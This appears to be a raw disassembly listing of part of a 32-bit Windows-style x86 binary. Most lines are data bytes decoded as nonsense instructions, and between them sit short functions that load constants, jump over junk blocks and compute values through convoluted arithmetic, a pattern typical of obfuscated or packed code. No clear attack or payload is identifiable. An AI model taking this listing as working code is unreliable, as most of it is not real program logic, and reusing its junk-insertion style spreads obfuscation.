  410c7b:	sbb    BYTE PTR [edi],0x31
  410c7e:	xor    ecx,DWORD PTR [ebx]
  410c80:	add    BYTE PTR [edx-0x31],bl
  410c83:	dec    edx
  410c84:	scas   eax,DWORD PTR es:[edi]
  410c85:	ins    DWORD PTR es:[edi],dx
  410c86:	mov    ds:0xf17dbc81,eax
  410c8b:	inc    ebp
  410c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c8d:	dec    esp
  410c8e:	addr16 jmp 0xe7a:0x9a586ce8
  410c96:	arpl   WORD PTR ds:0x7b4c9cf7,bp
  410c9c:	inc    edx
  410c9d:	sub    DWORD PTR [eax+0x8],ebp
  410ca0:	es jp  0x410d06
  410ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ca4:	sbb    eax,0x2a82b6fd
  410ca9:	mov    eax,0x6d3cee67
  410cae:	mov    esi,0x8e0f8952
  410cb3:	pop    edx
  410cb4:	sar    DWORD PTR [edi-0x40],1
  410cb7:	mov    cl,0xfe
  410cb9:	sub    ch,BYTE PTR [edx+0x17]
  410cbc:	mov    esp,DWORD PTR [ebx-0x14ff3d98]
  410cc2:	cmp    ecx,DWORD PTR [eax+0x69]
  410cc5:	aaa    
  410cc6:	int    0x15
  410cc8:	aam    0x2
  410cca:	push   edx
  410ccb:	pop    edx
  410ccc:	out    0xce,al
  410cce:	jne    0x410d23
  410cd0:	jle    0x410cfd
  410cd2:	pop    esp
  410cd3:	jbe    0x410c9f
  410cd5:	jns    0x410c5c
  410cd7:	fcmove st,st(7)
  410cd9:	outs   dx,BYTE PTR ds:[esi]
  410cda:	shr    BYTE PTR [ebp+0x16],cl
  410cdd:	sub    ebp,DWORD PTR [ecx-0xabf0dff]
  410ce3:	mov    DWORD PTR [edi-0x2130fa02],ebx
  410ce9:	out    0x61,eax
  410ceb:	sbb    eax,0x3bd9e1aa
  410cf0:	pop    ebp
  410cf1:	in     al,dx
  410cf2:	or     al,0x4
  410cf4:	scas   eax,DWORD PTR es:[edi]
  410cf5:	xchg   DWORD PTR [edi+0xa],ecx
  410cf8:	and    BYTE PTR [ebx+0x4100f955],0x66
  410cff:	pop    edx
  410d00:	mov    esi,0x442eec79
  410d05:	jmp    0xe5b16fa9
  410d0a:	pop    esi
  410d0b:	sub    ah,BYTE PTR [esi+edx*1-0x5c6b83a6]
  410d12:	xor    DWORD PTR [esi],esp
  410d14:	dec    ebx
  410d15:	fcmove st,st(5)
  410d17:	and    cl,dl
  410d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d1a:	xor    eax,0xd06f280c
  410d1f:	or     esp,DWORD PTR [ebx]
  410d21:	in     eax,0x37
  410d23:	in     al,dx
  410d24:	cli    
  410d25:	jnp    0x410d36
  410d27:	aad    0x8
  410d29:	dec    ecx
  410d2a:	push   DWORD PTR [eax+0x320abe91]
  410d30:	leave  
  410d31:	push   edi
  410d32:	dec    edx
  410d33:	sbb    BYTE PTR [ebx],dh
  410d35:	mov    eax,0x7df31486
  410d3a:	mov    bl,0x95
  410d3c:	fmul   st(0),st
  410d3e:	(bad)  [ebp+0x28]
  410d41:	xchg   ebp,eax
  410d42:	xchg   esp,eax
  410d43:	mov    eax,gs
  410d45:	inc    ebp
  410d46:	mov    ebp,0x3bb8adb9
  410d4b:	pop    ecx
  410d4c:	mov    ds:0x2bd80505,eax
  410d51:	call   0x1ed0:0x26e1f71
  410d58:	ds mov edx,0xcd4fc8a4
  410d5e:	in     al,0x31
  410d60:	jecxz  0x410dce
  410d62:	stos   BYTE PTR es:[edi],al
  410d63:	mov    WORD PTR [esi-0x3b],ss
  410d66:	adc    DWORD PTR [ebx-0x69de3d8c],ebx
  410d6c:	leave  
  410d6d:	dec    edi
  410d6e:	pop    ebx
  410d6f:	jne    0x410d44
  410d71:	add    ecx,DWORD PTR [esi]
  410d73:	dec    edi
  410d74:	xor    DWORD PTR [ecx],edi
  410d76:	xor    dl,bh
  410d78:	adc    cl,BYTE PTR [ebp+0x1bfb2aaa]
  410d7e:	mov    ch,0x7e
  410d80:	xchg   ebx,eax
  410d81:	pop    es
  410d82:	mov    ebx,cs
  410d84:	das    
  410d85:	int    0xaa
  410d87:	xor    eax,0x51735e56
  410d8c:	inc    edx
  410d8d:	pusha  
  410d8e:	in     eax,0xbe
  410d90:	gs xchg ebp,eax
  410d92:	or     bh,BYTE PTR [ebx-0x53]
  410d95:	inc    ecx
  410d96:	mov    edi,0xe1674c6e
  410d9b:	sub    al,0x27
  410d9d:	mov    ah,0xab
  410d9f:	call   DWORD PTR [esi+edx*4+0x8]
  410da3:	cmp    BYTE PTR [eax],ch
  410da5:	mov    al,ds:0x98046b0b
  410daa:	mov    ch,0x1d
  410dac:	pop    ebp
  410dad:	call   0x477d79e9
  410db2:	dec    esp
  410db3:	das    
  410db4:	adc    BYTE PTR [edx-0x7d],bh
  410db7:	(bad)  
  410db8:	jmp    0x410d43
  410dba:	mov    cl,0xc7
  410dbc:	(bad)  
  410dbd:	xor    cl,bl
  410dbf:	mov    ebp,0xb8db1aba
  410dc4:	mov    al,cl
  410dc6:	rcr    esi,1
  410dc8:	xchg   edx,eax
  410dc9:	fcom   DWORD PTR [eax]
  410dcb:	jo     0x410df7
  410dcd:	push   ebx
  410dce:	pop    edi
  410dcf:	ss lock ror bl,0xf
  410dd4:	jmp    0xd8ed:0x753fc643
  410ddb:	dec    ebx
  410ddc:	pop    esp
  410ddd:	scas   eax,DWORD PTR es:[edi]
  410dde:	and    BYTE PTR [ebx],dl
  410de0:	push   ecx
  410de1:	out    dx,al
  410de2:	pop    esi
  410de3:	dec    ebp
  410de4:	xor    eax,0xddb68c05
  410de9:	push   esp
  410dea:	jae    0x410e57
  410dec:	mov    DWORD PTR [eax+0x4],edx
  410def:	pop    ebx
  410df0:	leave  
  410df1:	ret    0x8
  410df4:	push   ebp
  410df5:	mov    ebp,esp
  410df7:	sub    esp,0x3c
  410dfa:	mov    DWORD PTR [ebp-0x20],0x3510
  410e01:	mov    DWORD PTR [ebp-0x1c],0x2104
  410e08:	mov    DWORD PTR [ebp-0x18],0x5d15
  410e0f:	mov    DWORD PTR [ebp-0x14],0x30cd
  410e16:	mov    DWORD PTR [ebp-0x10],0x1709
  410e1d:	mov    DWORD PTR [ebp-0xc],0x260b
  410e24:	jmp    0x4110ab
  410e29:	jo     0x410db5
  410e2b:	fldl2e 
  410e2d:	cmp    al,0xb9
  410e2f:	jo     0x410dcd
  410e31:	out    0x46,eax
  410e33:	mov    ah,BYTE PTR [ebp+edx*2+0x3bdd0266]
  410e3a:	dec    edx
  410e3b:	mov    esi,0xbec289be
  410e40:	mov    esi,0x8cd75af6
  410e45:	loop   0x410e49
  410e47:	pop    ss
  410e48:	jo     0x410e91
  410e4a:	clc    
  410e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e4c:	pop    ss
  410e4d:	icebp  
  410e4e:	mov    al,0x69
  410e50:	mov    dh,0xdf
  410e52:	clc    
  410e53:	sub    al,0x85
  410e55:	lahf   
  410e56:	idiv   BYTE PTR [ebx]
  410e58:	or     edx,DWORD PTR [ecx]
  410e5a:	sti    
  410e5b:	retf   
  410e5c:	jg     0xfdd918ba
  410e62:	(bad)  
  410e63:	loope  0x410df5
  410e65:	ins    DWORD PTR es:[edi],dx
  410e66:	into   
  410e67:	xchg   edx,eax
  410e68:	mov    bh,BYTE PTR [eax+eax*8+0x22e05466]
  410e6f:	mov    esi,0x5876a86d
  410e74:	int3   
  410e75:	add    eax,0x15f50c74
  410e7a:	ins    DWORD PTR es:[edi],dx
  410e7b:	test   eax,0x36a3595e
  410e80:	dec    ebx
  410e81:	add    al,0xbe
  410e83:	adc    eax,0x5904dacd
  410e88:	jb     0x410eb1
  410e8a:	xor    eax,0x89d0768c
  410e8f:	retf   
  410e90:	and    eax,0x950ad32a
  410e95:	or     ch,0x23
  410e98:	leave  
  410e99:	daa    
  410e9a:	scas   eax,DWORD PTR es:[edi]
  410e9b:	xchg   edi,eax
  410e9c:	retf   0x58f5
  410e9f:	loop   0x410e40
  410ea1:	mov    bl,0x40
  410ea3:	xchg   edi,eax
  410ea4:	scas   al,BYTE PTR es:[edi]
  410ea5:	sub    edi,DWORD PTR [eax+0x23]
  410ea8:	stc    
  410ea9:	push   esp
  410eaa:	neg    BYTE PTR [ecx-0x35]
  410ead:	jmp    DWORD PTR [ebx]
  410eaf:	mov    dh,0xc7
  410eb1:	sub    eax,0x417ec0ee
  410eb6:	stos   DWORD PTR es:[edi],eax
  410eb7:	xor    cl,BYTE PTR ds:0xca42fdeb
  410ebd:	daa    
  410ebe:	hlt    
  410ebf:	les    ebp,FWORD PTR [eax]
  410ec1:	aam    0xca
  410ec3:	inc    ecx
  410ec4:	imul   edx,DWORD PTR [ebx+eiz*1+0x53],0x10
  410ec9:	push   eax
  410eca:	test   eax,0xc54b2492
  410ecf:	push   ss
  410ed0:	pusha  
  410ed1:	call   0x8f03:0x76e70204
  410ed8:	sub    BYTE PTR [esi-0x77],bl
  410edb:	add    BYTE PTR [ebp-0x78],al
  410ede:	xor    eax,0xb08cb809
  410ee3:	xor    al,0x72
  410ee5:	in     eax,dx
  410ee6:	stc    
  410ee7:	cmp    dh,bh
  410ee9:	push   esp
  410eea:	lods   al,BYTE PTR ds:[esi]
  410eeb:	push   cs
  410eec:	aaa    
  410eed:	inc    ecx
  410eee:	push   ss
  410eef:	ret    0x8525
  410ef2:	fld    DWORD PTR [ecx+0x7f351402]
  410ef8:	dec    edi
  410ef9:	outs   dx,BYTE PTR ds:[esi]
  410efa:	ins    DWORD PTR es:[edi],dx
  410efb:	out    0x57,eax
  410efd:	push   es
  410efe:	out    0xb3,eax
  410f00:	das    
  410f01:	mov    ecx,0x5d2a7d07
  410f06:	mov    dl,BYTE PTR [edx+0x4b]
  410f09:	test   BYTE PTR ds:0xfdaa39bd,dl
  410f0f:	call   FWORD PTR [esi-0x58]
  410f12:	fisttp DWORD PTR [ebx+0x76]
  410f15:	gs inc edx
  410f17:	daa    
  410f18:	xchg   edx,eax
  410f19:	je     0x410f40
  410f1b:	lahf   
  410f1c:	in     al,0x71
  410f1e:	stos   BYTE PTR es:[edi],al
  410f1f:	(bad)  
  410f21:	in     eax,dx
  410f22:	or     eax,0x2b3d6c51
  410f27:	jb     0x410ed9
  410f29:	bound  edx,QWORD PTR [ebx-0x1f7d38c0]
  410f2f:	xchg   ebp,eax
  410f30:	test   DWORD PTR [eax+0x7622da3a],0xa6161af1
  410f3a:	push   ds
  410f3b:	jae    0x410ef8
  410f3d:	xor    eax,0x9745455e
  410f42:	push   ebx
  410f43:	jo     0x410fac
  410f45:	(bad)  
  410f46:	mov    ch,0x53
  410f48:	sbb    eax,0xc0865af6
  410f4d:	in     al,0x0
  410f4f:	or     bl,BYTE PTR [edx]
  410f51:	inc    edx
  410f52:	nop
  410f53:	push   esi
  410f54:	(bad)
  410f58:	jmp    0x410fce
  410f5a:	adc    BYTE PTR [esi+0x2a02a9f0],0x4d
  410f61:	lock dec esp
  410f63:	and    eax,0xb85a1fe1
  410f68:	adc    ebp,DWORD PTR [ebp+0xa87a507]
  410f6e:	mov    al,ds:0x7939a7fe
  410f73:	xchg   edi,eax
  410f74:	push   es
  410f75:	ror    DWORD PTR [esi],1
  410f77:	hlt    
  410f78:	(bad)  
  410f79:	and    eax,0x8c85139d
  410f7e:	adc    al,0x8
  410f80:	push   esp
  410f81:	mov    ebx,0x55311682
  410f86:	jecxz  0x410f58
  410f88:	sub    DWORD PTR [eax-0x20de4c60],esi
  410f8e:	inc    ebp
  410f8f:	mov    eax,es:0xab582ce5
  410f95:	and    DWORD PTR [ebx+0x24fafc3f],eax
  410f9b:	fild   WORD PTR [ebx+0x749fa908]
  410fa1:	jmp    0x4f7c:0x24b15597
  410fa8:	xchg   esp,eax
  410fa9:	cmp    al,0xb3
  410fac:	hlt    
  410fad:	or     eax,0x2753b69d
  410fb2:	(bad)  
  410fb3:	in     eax,dx
  410fb4:	xor    BYTE PTR [ecx-0x29],bl
  410fb7:	adc    eax,0x89ba631f
  410fbc:	retf   
  410fbd:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  410fbf:	test   al,0xfa
  410fc1:	or     eax,ebx
  410fc3:	or     ebx,DWORD PTR [eax+0x72]
  410fc6:	into   
  410fc7:	jmp    0x411036
  410fc9:	sbb    al,0x36
  410fcb:	cwde   
  410fcc:	mov    ds:0x93c0906,al
  410fd1:	cld    
  410fd2:	das    
  410fd3:	mov    bh,0x41
  410fd5:	stos   DWORD PTR es:[edi],eax
  410fd6:	outs   dx,DWORD PTR ds:[esi]
  410fd7:	sub    al,0x74
  410fd9:	xchg   esp,eax
  410fda:	in     al,dx
  410fdb:	or     ah,BYTE PTR [ecx]
  410fdd:	xor    al,0x1
  410fdf:	(bad)  
  410fe0:	mov    bh,0x8
  410fe2:	call   0x4084:0x5935faa5
  410fe9:	je     0x41103c
  410feb:	pop    edi
  410fec:	nop    DWORD PTR [edx+0x19af847a]
  410ff3:	xor    DWORD PTR [edi],ebp
  410ff5:	dec    esp
  410ff6:	dec    edi
  410ff7:	retf   0x9465
  410ffa:	int3   
  410ffb:	dec    edx
  410ffc:	sbb    eax,0x6d95805d
  411001:	sar    BYTE PTR [esi-0x71d62159],1
  411007:	cmp    DWORD PTR [ecx-0x35750c0],esp
  41100d:	mov    DWORD PTR [eax+0xca8d85e],ecx
  411013:	cli    
  411014:	into   
  411015:	fdiv   st(2),st
  411017:	ins    DWORD PTR es:[edi],dx
  411018:	in     eax,0xbb
  41101a:	sbb    DWORD PTR [ebp+edi*2-0x4c],ecx
  41101e:	(bad)  
  41101f:	jae    0x411097
  411021:	mov    edx,0x590350c2
  411026:	test   edi,ebp
  411028:	fbstp  TBYTE PTR [eax+0x1d]
  41102b:	xchg   DWORD PTR [esi+0x6805bcd6],eax
  411031:	adc    ebx,eax
  411033:	jl     0x410ff2
  411035:	fs push edx
  411037:	int3   
  411038:	mov    BYTE PTR [ebx-0x27],ch
  41103b:	mov    esi,0x9a61e1a5
  411040:	les    edx,FWORD PTR [esp+ebp*4+0x6b]
  411044:	cwde   
  411045:	pop    ss
  411046:	inc    eax
  411047:	push   es
  411048:	(bad)  
  41104a:	mov    edx,0x88eebfac
  41104f:	test   al,0x49
  411051:	outs   dx,BYTE PTR ds:[esi]
  411052:	mov    dl,0x7c
  411054:	idiv   BYTE PTR [ebx-0x13d7cbd9]
  41105a:	dec    esi
  41105b:	cmc    
  41105c:	cmc    
  41105d:	pop    ss
  41105e:	outs   dx,DWORD PTR ds:[esi]
  41105f:	pop    edi
  411060:	ja     0x410fef
  411062:	stc    
  411063:	pop    DWORD PTR [esi+0x5c315068]
  411069:	adc    ebp,eax
  41106b:	clc    
  41106c:	sbb    al,0x85
  41106e:	push   es
  41106f:	lds    ebp,FWORD PTR [edi+0x34]
  411072:	xchg   ebp,eax
  411073:	mov    ebp,0x110f05a4
  411078:	(bad)  
  411079:	loope  0x411009
  41107b:	inc    eax
  41107c:	nop
  41107d:	jne    0x411043
  41107f:	out    0xe7,al
  411081:	mov    bl,0x56
  411083:	loopne 0x4110ba
  411085:	mov    eax,0xf2544770
  41108a:	lods   al,BYTE PTR ds:[esi]
  41108b:	mov    edx,es
  41108d:	push   eax
  41108e:	sahf   
  41108f:	mov    esi,0x982ddf54
  411094:	jg     0x411037
  411096:	mov    eax,ds:0x54387afa
  41109b:	mov    ah,0xa5
  41109d:	xor    ebp,ecx
  41109f:	lock jo 0x411059
  4110a2:	inc    ebp
  4110a3:	dec    edi
  4110a4:	fld    QWORD PTR [ecx]
  4110a6:	pop    esp
  4110a7:	std    
  4110a8:	mov    ebx,0x45c7fec8
  4110ad:	clc    
  4110ae:	add    al,0x32
  4110b0:	add    BYTE PTR [eax],al
  4110b2:	mov    DWORD PTR [ebp-0x4],0x62ea
  4110b9:	mov    DWORD PTR [ebp-0x38],0x58e9
  4110c0:	jmp    0x411347
  4110c5:	pop    edx
  4110c6:	daa    
  4110c7:	fcomp  QWORD PTR [eax-0x44]
  4110ca:	mov    esp,0xf3ba2b5a
  4110cf:	aad    0xe3
  4110d1:	push   edx
  4110d2:	stos   DWORD PTR es:[edi],eax
  4110d3:	(bad)  
  4110d4:	fisttp QWORD PTR [eax]
  4110d6:	dec    esi
  4110d7:	mov    esi,0xbec289be
  4110dc:	mov    esi,0x8ccb3dc5
  4110e1:	mov    al,0x6b
  4110e3:	into   
  4110e4:	aad    0xa8
  4110e6:	mov    ecx,DWORD PTR [edx+0x33]
  4110e9:	pushf  
  4110ea:	xchg   edi,edi
  4110ec:	fwait
  4110ed:	add    ebx,DWORD PTR [edi-0x3ddfe546]
  4110f3:	or     ebx,DWORD PTR [ebp+0x5b388fb1]
  4110f9:	(bad)  
  4110fa:	cli    
  4110fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110fc:	dec    edx
  4110fd:	xchg   edi,eax
  4110fe:	(bad)  
  4110ff:	fs cmp al,0xd0
  411102:	ins    BYTE PTR es:[edi],dx
  411103:	mov    bl,0x3f
  411105:	mov    esi,0x50ad6169
  41110a:	and    esi,esp
  41110c:	sub    DWORD PTR [edx+ebp*1+0x7459c27f],ebx
  411113:	jo     0x4110de
  411115:	mov    bh,0xd6
  411117:	add    al,0x7
  411119:	xchg   esi,eax
  41111a:	dec    ebx
  41111b:	enter  0xd03,0x93
  41111f:	xor    al,0x73
  411121:	and    eax,0x4f22609b
  411126:	ins    BYTE PTR es:[edi],dx
  411127:	push   ebp
  411128:	mov    BYTE PTR [ecx+0x13fa54bf],bl
  41112e:	aaa    
  41112f:	scas   eax,DWORD PTR es:[edi]
  411130:	xor    ebp,ebx
  411132:	popa   
  411133:	ja     0x411128
  411135:	rol    BYTE PTR [ebp+0x46fb7fc0],0x32
  41113c:	scas   ax,WORD PTR es:[edi]
  41113e:	fisttp WORD PTR [eax-0xe]
  411141:	ss sbb al,0x95
  411144:	fwait
  411145:	xlat   BYTE PTR ds:[ebx]
  411146:	call   0x504d:0xa2af9d3f
  41114d:	push   es
  41114e:	mov    dl,0xd3
  411150:	addr16 xchg edx,eax
  411152:	inc    eax
  411153:	fs xchg esi,eax
  411155:	shr    DWORD PTR [edi-0x5f],1
  411158:	cmp    dl,BYTE PTR ds:[ecx-0x18]
  41115c:	in     al,dx
  41115d:	cwde   
  41115e:	fimul  WORD PTR [ecx]
  411160:	jle    0x4111b1
  411162:	mov    ds,ebx
  411164:	lods   al,BYTE PTR ds:[esi]
  411165:	mov    esi,0x9e96eed8
  41116a:	and    DWORD PTR [ebx*1+0x67fde607],edi
  411171:	into   
  411172:	inc    edi
  411173:	mov    ?,WORD PTR [ebp-0x78]
  411176:	ss pop edi
  411178:	mov    ecx,0xf6c1300b
  41117d:	pop    ecx
  41117e:	fwait
  41117f:	pushf  
  411180:	test   al,0x35
  411182:	fs jmp 0x4111c4
  411185:	push   eax
  411186:	into   
  411187:	outs   dx,BYTE PTR ds:[esi]
  411188:	or     bl,BYTE PTR [eax-0x63db624c]
  41118e:	mov    bl,BYTE PTR [esp+ebp*8]
  411191:	inc    edi
  411192:	in     al,dx
  411193:	mov    ecx,DWORD PTR [edx-0x18]
  411196:	sub    eax,0x4e33012a
  41119b:	in     al,0x1b
  41119d:	ja     0x411214
  41119f:	xchg   esi,eax
  4111a0:	nop    ecx
  4111a3:	inc    eax
  4111a4:	fistp  QWORD PTR [ecx+0x72d2276]
  4111aa:	fistp  QWORD PTR [ebx+0x639cdb20]
  4111b0:	das    
  4111b1:	mov    al,0x8e
  4111b3:	dec    esi
  4111b4:	stos   DWORD PTR es:[edi],eax
  4111b5:	jmp    FWORD PTR [edx+ecx*1-0x446cf293]
  4111bc:	jae    0x41117d
  4111be:	mov    esp,0xa5069aaa
  4111c3:	xchg   ebp,eax
  4111c4:	or     DWORD PTR [edi],esp
  4111c6:	mov    al,ds:0xfe7720fb
  4111cb:	jecxz  0x411200
  4111cd:	not    ecx
  4111cf:	or     cl,BYTE PTR [esi]
  4111d1:	xor    al,0x20
  4111d3:	std    
  4111d4:	ror    DWORD PTR [eax-0x2d],0x4c
  4111d8:	rol    esp,cl
  4111da:	sub    eax,esp
  4111dc:	ror    DWORD PTR [ecx+0x7f789f18],cl
  4111e2:	arpl   WORD PTR [esi-0x13f7dcf1],ax
  4111e8:	imul   DWORD PTR [ebp+0x55]
  4111eb:	loop   0x411229
  4111ed:	pop    edx
  4111ee:	push   eax
  4111ef:	sbb    eax,0xe7c3641b
  4111f4:	jno    0x4111b6
  4111f6:	mov    bl,0x8d
  4111f8:	test   eax,0x264274e8
  4111fd:	dec    ecx
  4111fe:	(bad)  
  4111ff:	adc    DWORD PTR [edi+ecx*1],edi
  411202:	fmulp  st(6),st
  411204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411205:	pop    esi
  411206:	fistp  DWORD PTR [edx-0x700f846]
  41120c:	mov    al,ds:0x1647adb
  411211:	rol    DWORD PTR [ebx],1
  411213:	(bad)  
  411214:	call   0x923f3e5a
  411219:	sbb    eax,DWORD PTR [eax-0x9]
  41121c:	(bad)  
  41121d:	fdiv   st(0),st
  41121f:	enter  0x1bc,0x9a
  411223:	aad    0xff
  411225:	inc    ecx
  411226:	scas   al,BYTE PTR es:[edi]
  411227:	lds    ebp,FWORD PTR [esi-0x25708566]
  41122d:	sahf   
  41122e:	nop
  41122f:	xor    al,0xd3
  411231:	add    al,0xe8
  411233:	pop    edx
  411234:	mov    dl,0x6a
  411236:	mov    WORD PTR [esi-0x50e185d5],ss
  41123c:	dec    eax
  41123d:	cs add al,0xd9
  411240:	inc    esi
  411241:	sbb    ch,0x18
  411244:	ficom  WORD PTR [edi+0x5be1c400]
  41124a:	ds pop ebx
  41124c:	jmp    0x411244
  41124e:	clc    
  41124f:	inc    esp
  411250:	out    0x21,al
  411252:	sub    bl,0xc
  411255:	fisub  DWORD PTR [edx]
  411257:	out    0xe5,eax
  411259:	or     BYTE PTR [edi-0x57],ah
  41125c:	cmp    ecx,0x200f9081
  411262:	mov    ch,0x1a
  411264:	mov    dh,0xce
  411266:	jae    0x4111e9
  411268:	retf   
  411269:	cwde   
  41126a:	out    dx,al
  41126b:	sub    al,0x9
  41126d:	lock mov esi,DWORD PTR [edi+ebp*2-0x2a]
  411272:	mov    al,ds:0x3d151e29
  411277:	cs inc eax
  411279:	jl     0x411243
  41127b:	push   esp
  41127c:	inc    edi
  41127d:	mov    edi,0x856d0261
  411282:	fst    st(5)
  411284:	loopne 0x411256
  411286:	mov    bh,0x45
  411288:	pop    es
  411289:	paddusw mm4,QWORD PTR [esi-0x75aa0139]
  411290:	in     al,dx
  411291:	push   eax
  411292:	sti    
  411293:	mov    BYTE PTR [edi+0x62],al
  411296:	add    bl,BYTE PTR [ecx+0x16911dcf]
  41129c:	(bad)  
  41129d:	shl    BYTE PTR [ebp+0x7750301],1
  4112a3:	sbb    eax,0xfe29fc9c
  4112a8:	fild   WORD PTR [edi+0x2b]
  4112ab:	lods   al,BYTE PTR ds:[esi]
  4112ac:	mov    eax,ds:0x572aa7f5
  4112b1:	xchg   esp,eax
  4112b2:	mov    ah,0xf
  4112b4:	cmp    al,bl
  4112b6:	jp     0x410345f2
  4112bc:	in     al,dx
  4112bd:	mul    DWORD PTR [ecx]
  4112bf:	xchg   ebp,eax
  4112c0:	xchg   DWORD PTR [ebp+0x24bd4828],ebp
  4112c6:	add    eax,0xdfebac8d
  4112cb:	mov    edi,0xf05a44af
  4112d0:	outs   dx,DWORD PTR ds:[esi]
  4112d1:	push   ebp
  4112d2:	push   ecx
  4112d3:	pop    esp
  4112d4:	retf   0x847d
  4112d7:	cld    
  4112d8:	test   DWORD PTR [ebx-0x779a3b90],edi
  4112de:	sub    ah,al
  4112e0:	push   ds
  4112e1:	and    DWORD PTR [esp+eax*2-0x1f],ebp
  4112e5:	mov    dh,0x46
  4112e7:	mov    cl,0x5
  4112e9:	push   ecx
  4112ea:	mov    esi,0x551db76a
  4112ef:	ret    0xfe2
  4112f2:	push   cs
  4112f3:	xchg   edx,eax
  4112f4:	and    DWORD PTR [ebx],eax
  4112f6:	dec    ecx
  4112f7:	or     al,0x69
  4112f9:	imul   esp,edi,0xc
  4112fc:	xchg   edx,eax
  4112fd:	xchg   esp,eax
  4112fe:	push   ebp
  4112ff:	add    al,0xf
  411301:	arpl   WORD PTR [esi-0x31c78122],cx
  411307:	cmp    ah,BYTE PTR [eax+0x7b]
  41130a:	and    DWORD PTR [esi+0x17],esi
  41130d:	jge    0x4112a4
  41130f:	fadd   DWORD PTR [ebx]
  411311:	pop    ds
  411312:	adc    dl,0x94
  411315:	jnp    0x411314
  411317:	inc    eax
  411318:	inc    ebp
  411319:	dec    edx
  41131a:	push   eax
  41131b:	aaa    
  41131c:	mov    edi,cs
  41131e:	stos   BYTE PTR es:[edi],al
  41131f:	(bad)  
  411320:	outs   dx,BYTE PTR ds:[esi]
  411321:	sub    eax,0xddf82e8f
  411326:	sub    esi,ebx
  411328:	fwait
  411329:	sbb    al,0x94
  41132b:	ins    DWORD PTR es:[edi],dx
  41132c:	jle    0x4112ae
  41132e:	jnp    0x41138a
  411330:	pop    ebp
  411331:	pop    edx
  411332:	push   es
  411333:	pop    esp
  411334:	jg     0x4112ec
  411336:	jge    0x4113a0
  411338:	adc    BYTE PTR [ecx-0xbc1fe3a],al
  41133e:	pusha  
  41133f:	fwait
  411340:	loopne 0x411305
  411342:	adc    DWORD PTR [esi-0x3868d153],edx
  411348:	inc    ebp
  411349:	int3   
  41134a:	mov    DWORD PTR [edi+0x0],edi
  41134d:	add    bh,al
  41134f:	inc    ebp
  411350:	rcr    dl,1
  411352:	jg     0x411354
  411354:	add    bh,al
  411356:	inc    ebp
  411357:	aam    0x89
  411359:	sub    BYTE PTR [eax],al
  41135b:	add    bh,al
  41135d:	inc    ebp
  41135e:	fmul   DWORD PTR [edi]
  411360:	sldt   WORD PTR [eax]
  411363:	mov    DWORD PTR [ebp-0x24],0x58e1
  41136a:	mov    DWORD PTR [ebp-0x3c],0x69c
  411371:	mov    eax,DWORD PTR [ebp-0x10]
  411374:	mov    ecx,DWORD PTR [ebp-0x14]
  411377:	and    al,0xb9
  411379:	add    al,cl
  41137b:	mov    ecx,DWORD PTR [ebp-0x18]
  41137e:	and    al,cl
  411380:	mov    ecx,DWORD PTR [ebp-0x1c]
  411383:	sub    al,0x11
  411385:	and    al,cl
  411387:	mov    ecx,DWORD PTR [ebp-0x20]
  41138a:	mov    edx,DWORD PTR [ebp+0x8]
  41138d:	imul   ecx,ecx,0x6008
  411393:	add    ecx,0x1759dd6e
  411399:	add    al,0x4d
  41139b:	xor    ecx,0x2b4185ee
  4113a1:	cmp    BYTE PTR [ecx+edx*1],al
  4113a4:	jne    0x41143e
  4113aa:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ad:	mov    eax,0xffffeff8
  4113b2:	mov    edx,eax
  4113b4:	sub    edx,ecx
  4113b6:	add    edx,DWORD PTR [ebp-0x8]
  4113b9:	mov    ecx,DWORD PTR [ebp-0xc]
  4113bc:	or     edx,ecx
  4113be:	mov    ecx,DWORD PTR [ebp-0x4]
  4113c1:	imul   edx,edx,0x85300
  4113c7:	sub    eax,ecx
  4113c9:	add    eax,DWORD PTR [ebp-0x8]
  4113cc:	mov    ecx,DWORD PTR [ebp-0xc]
  4113cf:	or     eax,ecx
  4113d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4113d4:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  4113db:	add    eax,0x40e5
  4113e0:	imul   eax,eax,0x214c
  4113e6:	add    eax,ecx
  4113e8:	mov    ecx,DWORD PTR [ebp+0x8]
  4113eb:	add    ecx,eax
  4113ed:	mov    DWORD PTR [ebp+0x8],ecx
  4113f0:	mov    eax,DWORD PTR [ebp-0x24]
  4113f3:	mov    ecx,DWORD PTR [ebp-0x28]
  4113f6:	and    eax,ecx
  4113f8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4113fb:	and    eax,ecx
  4113fd:	mov    ecx,DWORD PTR [ebp-0x30]
  411400:	imul   eax,ecx
  411403:	mov    ecx,DWORD PTR [ebp-0x34]
  411406:	or     eax,ecx
  411408:	mov    ecx,DWORD PTR [ebp-0x38]
  41140b:	imul   eax,ecx
  41140e:	mov    ecx,DWORD PTR [ebp+0x8]
  411411:	sub    eax,0x777ea653
  411416:	cmp    DWORD PTR [ecx+0x54],eax
  411419:	je     0x411427
  41141f:	mov    eax,DWORD PTR [ebp+0x8]
  411422:	jmp    0x41146e
  411427:	mov    eax,DWORD PTR [ebp-0x3c]
  41142a:	sub    eax,0x5258
  41142f:	xor    eax,0x49e9
  411434:	add    eax,0x253
  411439:	jmp    0x41146e
  41143e:	mov    DWORD PTR [ebp-0x3c],0x4177
  411445:	mov    DWORD PTR [ebp+0x8],0x1405
  41144c:	mov    eax,DWORD PTR [ebp+0x8]
  41144f:	mov    ecx,DWORD PTR [ebp-0x3c]
  411452:	imul   eax,eax,0x58cc
  411458:	add    eax,0x3f39
  41145d:	and    eax,ecx
  41145f:	add    eax,0x3b90
  411464:	or     eax,0x4b1c
  411469:	sub    eax,0x7fdd
  41146e:	leave  
  41146f:	ret    0x4
  411472:	push   ebp
  411473:	mov    ebp,esp
  411475:	and    esp,0xfffffff8
  411478:	sub    esp,0x20
  41147b:	push   ebx
  41147c:	push   esi
  41147d:	lea    eax,[esp+0x10]
  411481:	mov    DWORD PTR [esp+0xc],eax
  411485:	mov    eax,DWORD PTR [esp+0xc]
  411489:	mov    ecx,DWORD PTR [esp+0x10]
  41148d:	mov    edx,DWORD PTR [esp+0x14]
